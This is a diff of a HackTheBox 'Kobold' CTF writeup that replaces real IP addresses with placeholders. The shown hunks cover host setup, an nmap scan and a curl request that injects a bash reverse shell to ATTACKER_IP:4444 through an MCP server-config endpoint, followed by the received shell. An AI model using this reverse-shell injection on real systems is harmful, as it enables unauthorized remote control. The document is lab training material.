@@ -1,6 +1,6 @@
 # Kobold - HackTheBox Writeup
 
-**Target:** `10.129.13.179`
+**Target:** `TARGET_IP`
 **Domain:** `kobold.htb`
 **OS:** Linux (Docker-based)
 **Difficulty:** Medium
@@ -39,12 +39,12 @@ Privileged Container Mount → Root Flag
 
 ### Host Setup
 ```bash
-echo "10.129.13.179 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
+echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Nmap Scan
 ```bash
-nmap -sC -sV -p- 10.129.13.179
+nmap -sC -sV -p- TARGET_IP
 ```
 
 **Key Findings:**
@@ -104,7 +104,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
   -d '{
     "serverConfig": {
       "command": "/bin/bash",
-      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.178/4444 0>&1"],
+      "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],
       "env": {}
     },
     "serverId": "revshell"
@@ -118,7 +118,7 @@ curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
 
 **3. Reverse shell received:**
 ```bash
-connect to [10.10.14.178] from (UNKNOWN) [10.129.13.179] 4444
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
 ben@kobold:~$
